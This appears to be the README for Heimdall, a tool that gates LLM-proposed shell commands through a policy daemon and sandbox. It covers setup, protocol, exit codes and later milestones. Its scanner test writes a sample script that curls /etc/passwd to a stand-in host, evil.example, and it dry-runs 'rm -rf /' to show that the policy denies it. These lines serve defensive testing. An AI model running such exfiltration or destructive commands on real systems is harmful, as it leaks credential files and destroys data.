# Heimdall M4

Heimdall proposes one command at a time, checks it with a policy daemon, and
runs approved commands either directly or in a local `bwrap` sandbox. The daemon
never executes commands; the client uses the privileges of the user who started
it. The client never reads `safety.yaml` or the daemon's HMAC secret.

M4 includes the client, confirmation flow, direct and sandbox execution, static
scanner hooks, execution audit records, a Linux installer, a hardened systemd
unit, client-side rate limiting, per-user session logs, and an LLM loop.

## Windows development

```powershell
python -m pip install -r requirements.txt
python heimdald.py --dev --selftest
python -m unittest discover -s tests
python heimdald.py --dev
```

The daemon stays in the foreground. In a second terminal:

```powershell
python heimdall.py ping
python heimdall.py mode show --ascii --no-color
python heimdall.py --cmd "ls -la" --dry-run
python heimdall.py --cmd "nmap 127.0.0.1" --dry-run
python heimdall.py --cmd "python3 script.py" --dry-run
python heimdall.py --cmd "rm -rf /" --dry-run
```

The nmap preview requests the typed phrase; root deletion is denied. Dry-run
exercises confirmation, scanner metadata, and daemon approval but never launches
a command. A goal dry-run stops after its first proposal without reporting
simulated success.

Windows defaults to dry-run. `--execute-on-windows` opts into direct execution
of available native tools; Linux tools typically are not installed on Windows.
Batch files are unsupported. Commands use POSIX quoting on both platforms;
use forward slashes in quoted Windows executable paths.

This workspace has a local runtime: replace `python` with
`.\.tooling\python\python.exe` if needed. Tooling and runtime state are excluded
from Git. State lives in `dev-run/` under the working directory. Windows listens
on `127.0.0.1:47651`; TCP is unauthenticated and for local development only.

## Kali production setup or update

Fresh install or reconfigure:

```bash
cd ~/Desktop/heimdall
git pull --ff-only
sudo apt install python3-yaml bubblewrap shellcheck bandit
python3 -m unittest discover -s tests
sudo chmod +x heimdall-install.sh
sudo ./heimdall-install.sh
```

Pick `hybrid` unless you have a reason to force full sandbox or full direct
mode. The installer copies files to `/opt/heimdall`, installs `heimdall` into
`/usr/local/bin`, installs `heimdall-install` into `/usr/local/sbin`, writes the
mode file, installs `heimdald.service`, starts it, and verifies `heimdall ping`.

To reconfigure later:

```bash
sudo heimdall-install --mode sandbox
sudo heimdall-install --mode hybrid
sudo heimdall-install --uninstall
```

Manual foreground mode still works for development or debugging:

```bash
sudo systemctl stop heimdald
cd ~/Desktop/heimdall

sudo install -d -o root -g root -m 0755 /opt/heimdall
sudo install -o root -g root -m 0755 heimdald.py heimdall.py executor.py scanners.py /opt/heimdall/
sudo install -o root -g root -m 0600 safety.yaml /opt/heimdall/safety.yaml
sudo ln -sfn /opt/heimdall/heimdall.py /usr/local/bin/heimdall

sudo groupadd -f heimdall
sudo usermod -aG heimdall "$USER"
sudo python3 /opt/heimdall/heimdald.py --selftest
sudo python3 /opt/heimdall/heimdald.py --socket-group heimdall
```

The daemon remains running. In a second terminal, activate the new group
membership and test the client as your normal user:

```bash
newgrp heimdall
heimdall ping
heimdall mode show
sudo heimdall mode set sandbox
sudo heimdall mode set hybrid
heimdall --cmd "cat /etc/hostname"
heimdall --cmd "systemctl status sshd" --dry-run
heimdall --cmd "nmap -sn 127.0.0.1" --dry-run
heimdall --cmd "python3 script.py" --dry-run
```

Expected: ping succeeds, hostname prints, service and scan previews ask for
`I UNDERSTAND THE RISK`, and Python dry-run shows sandbox mode with scanner
metadata. The client does not elevate privileges. `sudo` wrappers are not
mapped. `newgrp` starts a subshell; `exit` leaves it.

To validate M3 sandbox and scanner behavior on Kali:

```bash
printf 'print("hi")\n' > /tmp/hello.py
heimdall --cmd "python3 /tmp/hello.py"

cat > /tmp/evil.py <<'EOF'
import subprocess
subprocess.run(["curl", "http://evil.example/", "-d", "@/etc/passwd"])
EOF
heimdall --cmd "python3 /tmp/evil.py"

sudo tail -5 /var/lib/heimdall/history/$(date -u +%Y-%m-%d).jsonl | python3 -m json.tool
```

Expected: a normal Python script is evaluated under sandbox mode, malicious
Python is blocked before execution when Bandit reports a high-severity finding
and `block_on_scan_fail` is enabled, and the history shows verdict plus
`exec_start`/`exec_end` records for executed commands.

Production requires root for the daemon and a private root-owned policy. Its
socket is `/run/heimdall/bifrost.sock`, mode 0660. `heimdald.service` runs the
daemon as root with group `heimdall` and hardening options such as
`ProtectSystem=strict`, `PrivateTmp=yes`, `NoNewPrivileges=yes`, and
`RestrictAddressFamilies=AF_UNIX`.

For Linux development, start `python3 heimdald.py --dev` and use
`python3 heimdall.py --dev ping`. Linux production does not fall back to a
development endpoint when its socket is missing. Restart the daemon after
updating so the latest verdict contract is available.

## Local LLM

Install Ollama using its [official instructions](https://docs.ollama.com/download).
Start its server if it is not already running:

```bash
ollama serve
```

In another terminal:

```bash
ollama pull qwen2.5-coder:7b
heimdall "list all listening TCP sockets" --dry-run
heimdall "list all listening TCP sockets" --max-steps 5 --timeout 30
```

On Windows, use `python heimdall.py` instead of the `heimdall` entry point.
Defaults use Ollama's [compatible chat endpoint](https://docs.ollama.com/api/openai-compatibility)
at `http://127.0.0.1:11434/v1/chat/completions` and `qwen2.5-coder:7b`.
No SDK or API key is needed for that local endpoint.

Use `--llm-url` / `--llm-model`, or `HEIMDALL_LLM_URL` /
`HEIMDALL_LLM_MODEL`, for another compatible server. M4 does not add API-key
authentication. The configured server receives your goal, executed commands,
and the last 2,000 characters of each output stream.

Plans must be JSON objects with action `execute`, `ask`, or `done`. Malformed
plans stop the loop. Execution errors are fed back to the LLM. The step cap or
repeating the same command with the same result twice stops with exit 5.
`--timeout` controls each command's deadline; the LLM deadline is twice that
value. Output capture retains at most 1 MiB per stream. Output is displayed
after each command finishes, rather than streamed live.

## Options and protocol

```text
heimdall ping
heimdall mode show
sudo heimdall mode set hybrid
heimdall banner
heimdall --cmd "ls -la" --dry-run --ascii --no-color
heimdall --socket /path/to/bifrost.sock --cmd "ls -la"
heimdall --tcp 127.0.0.1:47651 --cmd "ls -la" --dry-run
```

`HEIMDALL_ENDPOINT` accepts `unix:/path/to/socket` or `tcp:127.0.0.1:47651`.
Explicit endpoints or `--dev` take precedence. `--ascii` uses ASCII status symbols
and spinner frames. Color and animation turn off when redirected; `NO_COLOR`
disables color. Preview the daemon banner with `python3 heimdald.py --banner`.

Send newline-delimited JSON objects:

```json
{"op":"verdict","cmd":"nmap 127.0.0.1"}
{"op":"verdict","cmd":"nmap 127.0.0.1","confirm":true,"phrase":"I UNDERSTAND THE RISK"}
```

Unconfirmed `ASK` returns `confirm_phrase` and no token. Direct warnings require
a typed phrase; sandbox warnings use y/N. Destructive-study warnings always use
the destructive phrase. Approved re-requests return `ALLOW`, `confirmed:true`,
and a token. Confirmation cannot override denial. Final decisions and approval
are logged before returning; audit failures deny in both dev and production.

The client requires `ALLOW`, a token bound to the exact command and mode, and
resolved mode `direct` or `sandbox` before execution. It checks public hash and
mode fields; it cannot independently verify the HMAC signature and trusts the
configured daemon. Tokens have no expiry or replay protection and are not
standalone security capabilities. Confirmation records the client's assertion of
approval, not proof that a human was present. Before execution, the client sends
token-bound `exec_start`; after execution it sends `exec_end` with return code,
duration, output hashes, and whether `bwrap` was used.

`ping`, `mode_show`, and root-only production `mode_set` remain supported.
Use `sudo heimdall mode set sandbox|direct|hybrid`; the daemon checks the socket
peer uid, so non-root clients are refused in production.
Request mode overrides are rejected. Exit codes: 1 connection/LLM error,
2 denial or invalid CLI input, 3 declined confirmation, 4 execution blocked,
5 loop limit, 124 command timeout, 130 interrupted. One-shot mode otherwise
returns the command's exit code.

## Scope and validation

The resolver classifies simple commands and exact first-argument subcommands.
Compound shell syntax is denied, including inside quotes. Unsupported package
subcommands and options before subcommands fail closed. Classification does not
validate arbitrary script contents, executable provenance, or every argument.
Direct execution is not an isolation boundary.

The client keeps a best-effort per-user session replay log at
`~/.heimdall/session-YYYY-MM-DD.jsonl`. The daemon history remains the
authoritative audit log. The client also has a 30/minute token bucket guardrail;
daemon-side per-peer quotas are a later milestone. Sandbox execution depends on
Bubblewrap being installed and available as `bwrap`. Missing scanners are
reported and skipped; blocking happens only when a configured scanner runs and
reports a high-severity finding. History is hash-chained JSONL, but it cannot
protect against an attacker rewriting the complete log.

M1 was validated on Windows and Kali, including root production mode and a live
Unix-socket ping. M2 automated tests cover daemon confirmation, execution gates,
timeouts, bounded output, socket protocol, CLI previews, and an HTTP mock LLM
loop. M3 automated tests cover sandbox and scanner metadata, token-bound
execution audit ops, and the updated client execution path. M4 tests cover the
rate limiter, session log, mode-set client path, and installer syntax. Kali
systemd hardening should be checked with `systemd-analyze security heimdald.service`.

## M5 Dataset And Fine-Tune

M5 freezes the runtime interface and adds the model pipeline under `pipeline/`,
`train/`, and `eval/`. It does not require changes to `heimdall.py` or
`heimdald.py`.

Local plumbing check:

```bash
python -m pipeline.build --dry-run
python -c "import heimdall, pipeline.schema as s; assert heimdall.SYSTEM_PROMPT == s.SYSTEM_PROMPT"
python eval/run_all.py --model nonexistent
```

Build data with a running dev daemon:

```bash
python heimdald.py --dev
python -m pipeline.build --sources nl2bash darkknight trendyol
```

Train and install the model:

```bash
python train/train_qlora.py --config train/config.yaml
bash train/convert_gguf.sh out/heimdall-lora-v1
ollama create heimdall-v1 -f train/Modelfile
heimdall --llm-model heimdall-v1 "list all listening TCP sockets"
```

See `docs/M5_ACCEPTANCE.md` for the release checklist and eval gates.


### M6 memory and health checks

```bash
heimdall doctor
heimdall --project ABC "continue the audit"
heimdall --temp "inspect this once"
```

Project memory lives under `~/.heimdall/projects/<name>/memory.jsonl`. `--temp` disables session and project history for that run.


### M6c auto-approve and updates

`--auto-approve` accepts ASK verdicts silently only when the daemon policy opts in with `defaults.allow_auto_approve: true`. It never overrides DENY or global deny rules. If `auto_approve_requires_phrase` is true, the client asks for the configured phrase once per invocation.

```bash
heimdall --auto-approve --cmd "systemctl status sshd" --dry-run
sudo heimdall-update
```

`heimdall-update` fast-forwards the installed Git checkout, reruns the installer with the current mode, and restarts `heimdald`.


### M6d responsive terminal UI

Heimdall renders its banner and verdict panels with terminal-width-aware boxes. Resize the terminal between commands and the next panel follows the new width. `--ascii` keeps the same layout with plain `+`, `-`, and `|` borders for older terminals.


### M6d dashboard

`heimdall dashboard` opens a lightweight, read-only terminal dashboard inspired by btop. It shows daemon status, mode, system load, memory, disk usage, recent Heimdall activity, and top processes. Press `q` to quit.

```bash
heimdall dashboard
heimdall tui --refresh 0.5
```
